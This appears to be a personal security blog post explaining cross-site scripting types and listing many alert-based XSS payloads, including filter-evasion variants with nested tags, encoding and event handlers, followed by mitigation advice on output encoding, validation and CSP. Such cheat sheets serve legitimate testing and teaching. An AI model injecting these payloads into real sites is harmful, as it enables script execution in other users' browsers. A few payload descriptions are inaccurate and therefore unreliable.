---
title: Cross-Site Scripting (XSS) Payloads and Mitigation Strategies
# author: Gauranga
date: 2024-04-21 16:50:00 GMT+5:45
categories: [Writing]
tags: [XSS, Cross-Site Scripting, Security Vulnerability, Web Applications, Injection Attacks, JavaScript, Vulnerability Mitigation]
pin: true
math: true
mermaid: true
image: https://blogdetectify.cdn.triggerfish.cloud/uploads/2015/12/04174531/What-is-Cross-site-Scripting-XSS-and-how-can-you-fix-it_.png
#   path: /commons/devices-mockup.png
#   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
#   alt: Responsive rendering of Chirpy theme on multiple devices.
---

# Payloads for Cross-Site Scripting (XSS) Payloads

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts (typically written in JavaScript) into web pages viewed by other users. This can happen when user input is not properly validated or sanitized by the application before being displayed to other users.

There are several types of XSS attacks:

1. **Stored XSS:** Also known as persistent XSS, this occurs when the injected script is permanently stored on the target server, such as in a database or a file. Whenever a user visits the affected page, the malicious script is executed.
2. **Reflected XSS:** In this type of attack, the injected script is reflected off the web server, such as in an error message or search result. The attacker typically tricks a victim into clicking on a specially crafted link that contains the malicious payload.
3. **DOM-based XSS:** This occurs when the client-side script modifies the DOM (Document Object Model) in an unsafe way, leading to a XSS vulnerability. Unlike traditional XSS attacks, DOM-based XSS does not involve the server-side code.

XSS attacks can have serious consequences, including:

- Theft of sensitive information such as cookies, session tokens, and login credentials.
- Manipulation of user sessions and actions.
- Defacement of websites.
- Distribution of malware to other users.
- Redirection to malicious websites.
- Compromise of user privacy.

## Vulnerability Details:

### XSS in HTML/Applications:

1. **Basic Payloads:**
    - `<script>alert('XSS')</script>`: Executes a simple JavaScript alert function.
    - `<scr<script>ipt>alert('XSS')</scr<script>ipt>`: Attempts to evade filters by using nested script tags.
    - `"><script>alert('XSS')</script>`: Injects a script tag within an HTML attribute.
    - `"><script>alert(String.fromCharCode(88,83,83))</script>`: Utilizes character encoding to obfuscate the alert message.
    - `<script>\\u0061lert('22')</script>`: Uses Unicode encoding to represent the script tag.
    - `<script>eval('\\x61lert(\\'33\\')')</script>`: Executes the alert using JavaScript's eval function.
    - `<script>eval(8680439..toString(30))(983801..toString(36))</script>`: Dynamically executes an alert by converting integers to strings.
    - `<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">`: Uses HTML entity encoding to inject JavaScript.
2. **Img Payloads:**
    - `<img src=x onerror=alert('XSS');>`: Triggers an alert when the image fails to load.
    - `<img src=x onerror=alert('XSS')//`: Uses a comment to bypass filters.
    - `<img src=x onerror=alert(String.fromCharCode(88,83,83));>`: Uses character encoding for the alert message.
    - `<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>`: Repeats characters to evade detection.
    - `<img src=x:alert(alt) onerror=eval(src) alt=xss>`: Injects JavaScript through the alt attribute.
    - `"><img src=x onerror=alert('XSS');>`: Injects JavaScript within an HTML attribute.
3. **SVG Payloads:**
    - `<svgonload=alert(1)>`: Triggers an alert when the SVG loads.
    - `<svg/onload=alert('XSS')>`: Injects JavaScript within the onload attribute.
    - `<svg onload=alert(1)//`: Utilizes a comment to bypass filters.
    - `<svg/onload=alert(String.fromCharCode(88,83,83))>`: Uses character encoding for the alert message.
    - `<svg id=alert(1) onload=eval(id)>`: Dynamically executes the alert using the id attribute.
    - `"><svg/onload=alert(String.fromCharCode(88,83,83))>`: Injects JavaScript within an HTML attribute.
4. **Div Payloads:**
    - `<div onpointerover="alert(45)">MOVE HERE</div>`: Triggers an alert when the mouse pointer moves over the div element.
    - `<div onpointerdown="alert(45)">MOVE HERE</div>`: Triggers an alert when a pointer device button is pressed over the div.
    - `<div onpointerenter="alert(45)">MOVE HERE</div>`: Triggers an alert when the pointer enters the div element.
    - `<div onpointerleave="alert(45)">MOVE HERE</div>`: Triggers an alert when the pointer leaves the div element.
    - `<div onpointermove="alert(45)">MOVE HERE</div>`: Triggers an alert when the pointer moves within the div element.
    - `<div onpointerout="alert(45)">MOVE HERE</div>`: Triggers an alert when the pointer leaves the div element.
    - `<div onpointerup="alert(45)">MOVE HERE</div>`: Triggers an alert when a pointer device button is released over the div.

### XSS using HTML5 tags:

- **`<body onload=alert(/XSS/.source)>`**: Triggers an alert when the page loads.
- **`<input autofocus onfocus=alert(1)>`**: Triggers an alert when the input field gains focus.
- **`<select autofocus onfocus=alert(1)>`**: Triggers an alert when the select element gains focus.
- **`<textarea autofocus onfocus=alert(1)>`**: Triggers an alert when the textarea element gains focus.
- **`<keygen autofocus onfocus=alert(1)>`**: Triggers an alert when the keygen element gains focus.
- **`<video/poster/onerror=alert(1)>`**: Triggers an alert when the video fails to load.
- **`<video><source onerror="javascript:alert(1)">`**: Injects JavaScript within the source tag's onerror attribute.
- **`<video src=_ onloadstart="alert(1)">`**: Triggers an alert when the video begins to load.
- **`<details/open/ontoggle="alert\`**1`">`: Triggers an alert when the details element is toggled open.
- **`<audio src onloadstart=alert(1)>`**: Triggers an alert when the audio begins to load.
- **`<marquee onstart=alert(1)>`**: Triggers an alert when the marquee element starts scrolling.
- **`<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>`**: Triggers an alert when the mouse pointer is moved over the meter element.
- **`<body ontouchstart=alert(1)>`**: Triggers an alert when a touch event starts.
- **`<body ontouchend=alert(1)>`**: Triggers an alert when a touch event ends.
- **`<body ontouchmove=alert(1)>`**: Triggers an alert when a touch event moves.

## Recommendation:

To mitigate the risk of XSS attacks, the following recommendations are provided:

- Implement strict input validation mechanisms to filter out potentially malicious input.
- Utilize output encoding techniques (e.g., HTML entity encoding, JavaScript escaping) to render user-supplied data safely.
- Implement a Content Security Policy (CSP) to restrict the execution of inline scripts and mitigate XSS risks.
- Conduct regular security assessments, including code reviews and penetration tests, to identify and remediate vulnerabilities.
- Educate developers on secure coding practices to prevent the introduction of XSS vulnerabilities in future development efforts.

The identified XSS vulnerabilities pose a significant threat to the security. By exploiting these vulnerabilities, attackers could execute arbitrary JavaScript code within the context of users' browsers, leading to various security risks, including data theft and unauthorized access. It is imperative that immediate action is taken to address these vulnerabilities and implement the recommended mitigation strategies to safeguard the application against XSS attacks.